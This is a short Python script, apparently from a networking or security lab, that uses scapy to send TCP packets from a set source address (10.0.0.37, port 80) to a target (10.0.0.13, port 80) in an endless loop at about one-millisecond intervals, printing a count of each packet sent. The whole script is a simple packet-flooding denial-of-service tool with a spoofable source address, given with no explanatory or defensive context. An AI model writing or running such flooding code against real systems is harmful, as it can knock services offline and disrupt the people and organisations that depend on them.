from scapy.all import *
source_IP = '10.0.0.37' #input("Enter IP address of Source: ")
target_IP = '10.0.0.13' #input("Enter IP address of Target: ")
source_port = 80  #int(input("Enter Source Port Number:"))
i = 1

while True:
   IP1 = IP(src = source_IP, dst = target_IP)
   TCP1 = TCP(sport = source_port, dport = 80)
   pkt = IP1 / TCP1
   send(pkt, inter = .001)
   print ("packet sent ", i)
   i = i + 1
